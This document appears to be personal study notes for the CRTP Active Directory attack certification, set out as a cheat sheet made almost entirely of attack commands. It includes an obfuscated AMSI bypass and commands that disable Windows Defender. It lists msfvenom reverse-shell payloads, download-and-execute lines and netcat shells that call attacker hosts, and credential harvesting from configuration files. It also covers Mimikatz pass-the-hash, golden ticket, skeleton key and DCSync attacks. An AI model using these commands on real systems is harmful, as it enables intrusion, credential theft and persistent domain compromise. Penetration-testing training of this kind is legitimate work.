# CRTP 

# AMSI Bypass and Disable


```powershell
https://amsi.fail/   
Set-MpPreference -DisableScriptScanning 1
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```


# Windows Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus  
Set-MpPreference -DisableIOAVProtection $true 
```


# Disable Firewall

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus  
Set-MpPreference -DisableIOAVProtection $true 
```


# Enumeration
#### PowerShell Cmdlets

Current Domain
```powershell
Get-NetDomain
```

Get objects in Domain
```powershell
Get-NetDomain -Domain domain.local
```

Get domain SID
```powershell
Get-DomainSID
```

Get Domain Policies
```powershell
Get-DomainPolicy
```

Get info from Domain Policies

```powershell
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."Kerberos Policy"
```

Get domain controllers from current domain

```powershell
Get-NetDomainController (PowerView)
Get-ADDomainController (AD Module)
```

Get Users from current domain

```powershell
Get-NetUser
Get-NetUser -Username user
Get-NetUser -Username user | select -ExpandProperty samaccountname
```

Get Description

```powershell
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
Find-UserField -SearchField Description -SearchTerm "built"
```

List Computers

```powershell
Get-NetComputer
Get-NetComputer -OperatingSystem "*<version>*"
Get-NetComputer -FullData
```

Get groups current domain

```powershell
Get-NetGroup
Get-NetGroup -Domain <domain>
```

Get Member from group

```powershell
Get-NetGroupMember -GroupName '<Name>'
Get-NetGroupMember -GroupName '<Name>' -Domain <domain>
Get-NetGroupMember -GroupName '<Name>' -Recurse
Get-ADGroupMember -Identity '<Name>' -Recursive
```


Logged On Users

```powershell
Get-NetLoggedon -ComputerName <domain>
```

Find Shares and sensitive files

```powershell
Invoke-ShareFinder -Verbose
Invoke-FileFinder -Verbose
Get-NetFileServer
```

List GPO

```powershell
Get-NetGPO
Get-NetGPO -ComputerName <computername.domain>
Get-NetGPO -ADSPath <ADSPath>
Get-GPO -All
```

Get GRP from Restricted Groups or groups.xml

```powershell
Get-NetGPOGroup
```

Get machines from user from specific group

```powershell
Find-GPOLocation -UserName <user> -Verbose
```

Get OUs and GPO aplliend on an OU

```powershell
Get-NetOU -FullData
Get-GetGPO -GPOname <ou>
```

Get ACLs from user

```powershell
Get-ObjectAcl -SamAccountName <user> -ResolveGUIDs
```

Get ACL associated with prefix,path and LDAP

```powershell
Get-ObjectAcl -ADSprefix '<prefix>' -Verbose
Get-ObjectAcl -ADSpath "<LDAP>" -ResolveGUIDs -Verbose
Get-PathAcl -Path "<path>"
```

Search ACEs

```powershell
Invoke-ACLScanner -ResolveGUIDs
```

Domain Trust

```powershell
Get-NetDomainTrust
Get-NetDomainTrust -Domain <domain>
Get-NetForest
Get-NetForestDomain
```

Local Admin Access from all machines

```powershell
Find-LocalAdminAcess -Verbose
Invoke-CheckLocalAdminAccess
Find-PSRemotingLocalAdminAccess
```

User Hunting

```powershell
Invoke-UserHunter
Invoke-UserHunter -CheckAccess
```

Applocker
```powershell
Get-AppLockerPolicy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

WMI
```powershell
gwmi -Class win32_computersystem -CpmputerName <computername>
```

## SharpHound (Auto Enum)
SharpHound

```
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -ColletionMethod LoggedOn
```

# Privilege Escalation
### Unquoted PoC
```
Get-wmiobject -Class win32_service
Get-wmiobject -Class win32_service | select pathname
. .\PowerUp.ps1
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose
Invoke-AllChecks
```

beRoot ([https://github.com/AlessandroZ/BeRoot](https://github.com/AlessandroZ/BeRoot))

```
.\beRoot.exe
```

Privesc ([https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc))

```
. .\privesc.ps1
Invoke-Privesc
```

Remeber Feature Abuse like Jenkins


### SeBackup / SeRestore

-> Detection

```
whoami /priv
\\SeBackupPrivilege  
\\SeRestorePrivilege  
```

-> Exploitation

```
reg save hklm\system C:\Users\user\system.hive  
reg save hklm\sam C:\Users\user\sam.hive
```



### SeTakeOwnership

-> Detection

```
whoami /priv  
//SeTakeOwnership
```

-> Exploitation

```
takeown /f C:\Windows\System32\Utilman.exe  
icacls C:\Windows\System32\Utilman.exe /grant <user>:F  
copy cmd.exe utilman.exe
```



### SeImpersonate / SeAssignPrimaryToken

-> Detection

```
whoami /priv
// SeAssignPrimaryTokenPrivilege
// SeImpersonatePrivilege
```

-> Exploitation

```
powershell.exe -c "wget http://ip/RogueWinRM.exe -O RogueWinRM.exe"  
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\nc64.exe" -a "-e cmd.exe <ip> <port>"
```


#### Other Docs

[https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)  
[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)



### Tasks

-> Detection

```
schtasks
schtasks /query /tn <task> /fo list /v
icacls <task_path> 
\\ BUILTIN\Users:(I)(F)
```

-> Exploitation

```
echo "net localgroup administrators user /add" > <task_path>
schtasks /run /tn <task>
```

Creating tasks

```CMD
schtasks /create /S <ComputerName> /SC Weekly /RU "NT Authority\SYSTEM" /TN <NAME> /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S <ComputerName> /TN <NAME>
```



### Autorun

-> Detection

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu ""C:\Program Files\Autorun Program"  
\\FILE_ALL_ACCESS
```

-> Exploitation

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o program.exe
```

```
move program.exe "C:\Program Files\Autorun Program"
logoff
```



### AlwaysInstallElevated

-> Detection

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer 
\\ value is 1  
reg query HKCU\Software\Policies\Microsoft\Windows\Installer  
\\ value is 1 
```

-> Exploitation

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=ip lport=port -f msi -o ok.msi
msiexec /quiet /qn /i C:\Temp\ok.msi
```

#### Registry

-> Detection

```
powershell.exe -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"  
\\NT AUTHORITY\INTERACTIVE Allow FullControl  
net localgroup administrators
```

-> Exploitation

```
wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c (edit)  
sudo apt install gcc-mingw-w64  
x86_64-w64-mingw32-gcc windows_service.c -o ok.exe  
```

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\ok.exe /f  
sc start regsvc  
net localgroup administrators
```


#### Executable Files

-> Detection

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
\\RW Everyone  
\\  FILE_ALL_ACCESS  
net localgroup administrators
```

-> Exploitation

```
wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c (edit)
sudo apt install gcc-mingw-w64  
x86_64-w64-mingw32-gcc windows_service.c -o ok.exe
```

```
copy /yc:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```



### Startup Applications

-> Detection

```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | findstr (F)  
\\BUILTIN\Users:(F)
```

-> Exploitation

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o ok.exe
```

```
powershell.exe -c "wget http://ip/ok.exe"
move ok.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”
logoff
```



### Hot Potatle

-> Exploitation

```
net localgroup administrators  
powershell.exe -nop -ep bypass  
powershell.exe -c "wget https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1 -O Tater.ps1"  
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1  
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"  
net localgroup administrators
```



### DLL Hijacking

-> Exploitation

```
wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_dll.c (edit)  
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll  
move hijackme.dll <path>  
sc stop <service_name> & sc start <service_name>  
```



## Capturing configuration file credentials

-> Powershell History

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

-> EXploiting Saved Windows Credentials

```
cmdkey /list  
runas /savecred /user:admin cmd.exe
```

-> IIS Configuration

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString  
type C:\inetpub\wwwroot\web.config | findstr connectionString
```

-> Retrieve Credentials from Software: PuTTY

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

-> Unattended Windows Installations

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

-> Identify

```
dir /s *.db
```

-> McAfee Enterprise Endpoint Security - Credentials used during installation

```
C:\ProgramData\McAfee\Agent\DB\ma.db
sqlitebrowser ma.db
python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
```

[https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py](https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py)

## Unconstrained Delegation
PowerView
```powershell
Get-NetComputer -UnConstrained
```
Mimikatz
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```
## Constrained Delegation
PowerView
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
kekeo
```powershell
tgt::ask /user:<user> /domain:<domain> /rc4:<aes_key>
```
kekeo
```powershell
tgs::s4u /tgt:<ticket_file> /user:<User> /service<SPN Service>
```
MimiKatz
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt <Ticket delegated>"'
```

## Dns Admins
Enum
```powershell
Get-NetGroupMember -GroupName "DNSAdmins"
```
Exploitation
```cmd
dnscmd DC /config /serverlevelplugindll \\ip\dll\mimilib.dll
```

# Trust Abuse
## MSSQL Servers
Discovery (SPN Scanning)
```powershell
Get-SQLInstance Domain
```
Check Accessibility
```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
Gather Information
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```
Executing Commands
```powershell
Get-SQLServerLinkCrawl -Instance DC -Query "exec master..xp_cmdshell 'whoami'"
```


# Lateral Movement

## Over pass the hash

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe"'
```


## PSSession

```
$sess = New-PSSession -ComputerName <domain>
Enter-PSSession -Session $sess
```


## Invoke-Command

```
Invoke-Command -ComputerName <domain> -ScriptBlock {<command>}
Invoke-Command -ComputerName <domain> -FilePath <Path>
Invoke-Command -ComputerName <domain> -ScriptBlock ${function:<local_function>}
```


## Invoke-Command from any domains

```
Invoke-Command -ScriptBlock {Command} -ComputerName (Get-Content <list-servers>)
Invoke-Command -FilePath <Path> -ComputerName (Get-Content <list-servers>)
Invoke-Command -ComputerName (Get-Content <list-servers>) -ScriptBlock ${function:<local_function>}
```



## Kerberoasting
Get all user with SPN
```
Get-NetUser -SPN
```

Request ticket to the service
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"
```

Dump ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

Get all user wih pre-auth not required

```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

ASREPRoasr
```powershell
GetpASREPHash -UserName use -Verbose
```

# Persistence
## Golden Ticket
```mimikatz
kerberos::golden /domain:itsec.lab /sid:<domain sid> /user:krbtgt /krbtgt:<krbtgt ntml> /ptt
```


## Silver Ticket
```
kerberos::golden /domain:<domain> /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:<AES Key> /user:<user> /service:<spn service> /target:<computername domain>
```


## Skeleton Ticket
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```


## DSRM
Enable Pass the Hash to Admin
```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
## DCSync

```
lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:corp\krbt
```

Add is user have rights to do that

```powershell
Add-ObjectAcl -TargetDistinguisedName "ldap" -PrincipalSamAccountName user -Rights DCSync -Verbose
```

Add is user have rights to do that

```powershell
Get-ObjectAcl -DistinguishedName "ldap" -ResolveGUIDs | ?{($_.IdentityReference -match "studentx") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
Check if have DCSync rights
```powershell
Get-ObjectAcl -DistinguishedName "dc=offensive,dc=local" -ResolveGUIDs | ?
{($_.IdentityReference -match "sqlserversync") -and (($_.ObjectType -match 'replication') -or
($_.ActiveDirectoryRights -match 'GenericAll'))}
````
## DC Shadow
Mimikatz method
```
!+
!processtoken
lsadump::dcshadow /object:user /attribute:Description /value:<value>
<open other mimikatz>
privilege::debug
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash ntlm> /impersonate
lsadump::dcshadow /push
```

## CrossForest  Trust Domain

Get trust key
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

Create Inter-Realm TGT
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /rc4:<trust key> /service:krbtgt /target:eurocorp.local /ticket:ticket.kirbi"'
```

Get TGS from a service in forest
```powershell
.\asktgs.exe ticket.kirbi CIFS/<trust_forest>
```

```powershell
.\kirbikator.exe lsa .\CIFS.<trust_forest>.kirbi
```

# Dump hashes and Credentials


## Retrive machine account hash
```
Get-RemoteMachineAccountHash -ComputerName <dc> -Verbose
```


## Retrive local account hash
```
Get-RemoteLocalAccountHash -ComputerName <DC> -Verbose
```


## Retrive domain cached credentials
```
Get-RemoteCachedCredential -ComputerName <DC> -Verbose
```



# Mimikatz

## Golden Ticket
```mimikatz
kerberos::golden /domain:itsec.lab /sid:<domain sid> /user:krbtgt /krbtgt:<krbtgt ntml> /ptt
```

## Silver Ticket
```
kerberos::golden /domain:<domain> /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:<AES Key> /user:<user> /service:<spn service> /target:<computername domain>
```

## DCSync

```
lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbt
```
